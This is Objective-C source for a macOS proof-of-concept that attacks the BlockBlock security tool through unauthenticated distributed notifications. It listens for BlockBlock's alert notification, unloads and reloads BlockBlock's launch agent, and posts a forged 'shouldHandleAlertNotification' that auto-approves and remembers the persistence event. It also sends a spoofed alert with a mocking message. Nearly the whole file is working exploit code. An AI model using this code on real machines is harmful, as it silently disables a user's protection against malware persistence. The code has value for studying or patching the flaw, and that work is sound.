#import "AppDelegate.h"

@implementation AppDelegate

- (void)start
{
	NSDistributedNotificationCenter *center = [NSDistributedNotificationCenter defaultCenter];
	
	[center addObserver:self selector:@selector(fyi:) name:nil object:nil suspensionBehavior:NSNotificationSuspensionBehaviorDeliverImmediately];
}

- (void)stop
{
	NSDistributedNotificationCenter *center = [NSDistributedNotificationCenter defaultCenter];
	
	[center removeObserver:self];
}

- (void)fyi:(NSNotification *)notification
{
	/*
	
	IMPORTANT
	
	NSDistributedNotificationCenter does not implement a secure communications protocol.
	When using distributed notifications, your app should treat any data passed in the notification as untrusted.
	See Security Overview for general guidance on secure coding practices.
	
	*/
	
	if ([notification.name isEqualToString:@"shouldDisplayAlertNotification"])
	{
		[self unload];
		
		[self pwn:[notification userInfo]];
		
		[self load];
	}

	NSLog(@"%@", notification);
}

- (void)pwn:(NSDictionary *)userInfo
{
	NSDistributedNotificationCenter *center = [NSDistributedNotificationCenter defaultCenter];
	
	NSDictionary *pwnInfo = @{ @"action": @(1), @"remember": @(1), @"watchEventUUID": userInfo[@"watchEventUUID"] };
	
	[center postNotificationName:@"shouldHandleAlertNotification" object:nil userInfo:pwnInfo options:NSNotificationDeliverImmediately|NSNotificationPostToAllSessions];
}

- (void)unload
{
	NSTask *task = [[NSTask alloc] init];
	
	task.launchPath = @"/bin/launchctl";
	task.arguments = @[ @"unload", @"Library/LaunchAgents/com.objectiveSee.blockblock.plist" ];
	task.currentDirectoryPath = NSHomeDirectory();
	
	[task launch];
	[task waitUntilExit];
}

- (void)load
{
	NSTask *task = [[NSTask alloc] init];
	
	task.launchPath = @"/bin/launchctl";
	task.arguments = @[ @"load", @"Library/LaunchAgents/com.objectiveSee.blockblock.plist" ];
	task.currentDirectoryPath = NSHomeDirectory();
	
	[task launch];
	[task waitUntilExit];
}

- (void)alert
{
	NSDistributedNotificationCenter *center = [NSDistributedNotificationCenter defaultCenter];
	
	NSDictionary *userInfo = @{	@"alertMsg": @"WRITING BAD @$$ LAMWARE FOR OS X",
								@"itemBinary": @"/Applications/BlockBlock.app/Contents/MacOS/BlockBlock",
								@"itemFile": [NSString stringWithFormat:@"%@/Library/LaunchAgents/com.objectiveSee.blockblock.plist", NSHomeDirectory()],
								@"itemName": @"com.objectiveSee.blockblock",
								@"parentID": @(1),
								@"pluginType": @(2),
								@"processHierarchy": @[ @{ @"index": @(0), @"name": @"kernel_task", @"pid": @(0) },
														@{ @"index": @(1), @"name": @"launchd", @"pid": @(1) },
														@{ @"index": @(2), @"name": @"launchd", @"pid": @(1337) } ],
								@"processID": @(1337),
								@"processIcon": [NSData dataWithContentsOfFile:@"/Applications/BlockBlock.app/Contents/Resources/AppIcon.icns"],
								@"processLabel": @"Patrick Wardle",
								@"processName": @"BlockBlock",
								@"processPath": @"/Applications/BlockBlock.app/Contents/MacOS/BlockBlock",
								@"targetUID": @(501),
								@"watchEventUUID": @"FFFFEEEE-DDDD-CCCC-BBBB-AAAA00000000" };
	
	[center postNotificationName:@"shouldDisplayAlertNotification" object:nil userInfo:userInfo options:NSNotificationDeliverImmediately|NSNotificationPostToAllSessions];
}

@end
